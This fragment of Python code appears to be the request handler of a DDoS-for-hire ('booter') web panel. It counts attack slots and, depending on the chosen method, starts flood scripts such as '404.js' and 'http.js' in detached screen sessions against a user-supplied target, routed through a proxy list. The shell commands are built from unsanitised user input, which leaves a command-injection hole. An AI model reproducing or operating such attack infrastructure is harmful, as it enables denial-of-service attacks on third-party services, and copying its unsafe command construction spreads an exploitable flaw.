...
def execute_command():
    ...
    if attack_slots >= MAX_SLOTS:
        return jsonify({'error': f'Exceeded maximum slots of {MAX_SLOTS}.'}), 400

    if method.upper() == 'HTTP':
        command = f"screen -dm timeout {duration} node 404.js {target} {duration} 8 1 proxy.txt"
    elif method.upper() == 'HTTPS':
        command = f"screen -dm timeout {duration} node 404.js {target} {duration} 8 1 proxy.txt"
    elif method.upper() == 'DSTAT':
        command = f"screen -dm timeout {duration} node http.js {target} {duration}"
    elif method.upper() == 'PROXY':
        command = f"screen -dm timeout {duration} python3 proxy.py"
    ...
    scheduler.add_job(decrease_slots_inner, 'interval', seconds=duration)
